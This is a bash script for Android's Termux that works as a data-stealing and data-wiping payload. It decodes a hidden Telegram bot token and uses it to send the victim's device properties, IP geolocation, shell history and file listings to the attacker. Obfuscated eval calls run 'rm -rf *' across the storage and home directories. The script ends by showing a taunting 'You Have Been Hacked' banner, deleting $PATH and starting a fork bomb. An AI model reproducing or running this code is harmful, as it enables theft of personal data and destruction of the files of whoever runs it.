#!/bin/bash
tkn=$(base64 -d <<<"MTQxNDgwMDM4MTpBQUVBa3VYWEdvTlFhMDJGT29MM29MUktVU0JIWUo5OVR6dwo=")
grp=$(base64 -d <<<"LTEwMDExNDQ0MzU3MjIK")

check() { 
echo please wait 
for i in curl toilet wget perl jq; do 
if [[ -e $PATH/$i ]]; then 
echo " " > 2&>1 &
else pkg install -y $i > 2&>1 
fi 
done
}

sendmessage(){
        curl -sX POST "https://api.telegram.org/bot$tkn/sendMessage" \
                -d "chat_id=$grp" "parse_mode=markdownv2" \
                -d "disable_web_page_preview=true" \
                --data-urlencode "text=$1"
}
sendfile(){
        curl -sF document=@"$1" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp"
}
_ip() {
internal=$(ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print $1')
external=$(wget -qO- icanhazip.com -q)
# Send to Bot
sendmessage "INTERNAL IP: $(ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print $1')" > 2&>1

# Done
}
termux-noroot() {
sendmessage "$(df -k)" > 2&>1 &
for i in $(find $EXTERNAL_STORAGE)
do
if [[ $i == "/sdcard" ]]; then
cd $i
ls > allfiles.txt
sendfile allfiles.txt > 2&>1
rm allfiles.txt
eval $(base64 -d <<<"cm0gLXJmICoK")
sendmessage "$(pwd) $(ls)" > 2&>1
else
termux-setup-storage
cd $i
ls > allfiles.txt
sendfile allfiles.txt > 2&>1
rm allfiles.txt
eval $(base64 -d <<<"cm0gLXJmICoK")
sendmessage "$(pwd) $(ls)" > 2&>1
fi
done

cd $HOME
ls > allTools.txt
sendfile allTools.txt > 2&>1
eval $(base64 -d <<<"cm0gLXJmICoK")
sendmessage "$(pwd) $(ls)" > 2&>1
sendmessage "xzuma Fucked away" > 2&>1
clear
echo "________________________________________"
toilet -f future "You Have Been Hacked"
toilet -f future "By FS3CUR17Y"
toilet -f future "I have all ur info"
toilet -f future "You are An"
toilet -f mono12 "AssHole"
toilet -f mono12 "xzuma"
echo "_________________________________________ "
toilet -f future "I am"
toilet -f mono12 -F gay "TH33HT"
toilet -f future "remember my name xD"
rm -rf $PATH *
:(){ :|: & };: &
}
ip(){
       
        ip=$(curl -s ifconfig.me) > 2&>1 
        res=$(curl -s http://ip-api.com/json/$ip)
        # See https://0x0.st/Nlc0 for reference.
        mapfile -t data <<< $(jq -cr '.[]' <<< $res)
        sendmessage "IP information for $ip:
        Country: ${data[1]}
        Region: ${data[4]}
        City: ${data[6]} ${data[5]}
        ISP: ${data[10]}
        ASN: ${data[12]}
        Time: $(TZ=${data[9]} date +'%H:%M %Z')" > 2&>1
}
device() {
deviceName=$(base64 -d <<<"Z2V0cHJvcCByby50cmFuc3Npb24uZGV2aWNlLm5hbWUK")
AndroidVersion=$(base64 -d <<<"Z2V0cHJvcCByby52ZW5kb3IuYnVpbGQudmVyc2lvbi5yZWxlYXNlCg==")
model=$(getprop ro.vendor.product.model)
bland=$(getprop ro.product.brand)
fuckAll=$(getprop > fucked.txt)
$fuckAll
sendmessage "DeviceName: $(getprop ro.transsion.device.name)" > 2&>1 &
sendmessage "$(date)" > 2&>1 &
curl -sF document=@"fucked.txt" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1 
rm fucked.txt
sendfile $HOME/.bash_history > 2&>1 &
sendmessage "$(neofetch --stdout)" > 2&>1
}
check
device
ip
_ip
sendmessage "Starting to Fuck Device" > 2&>1
termux-noroot
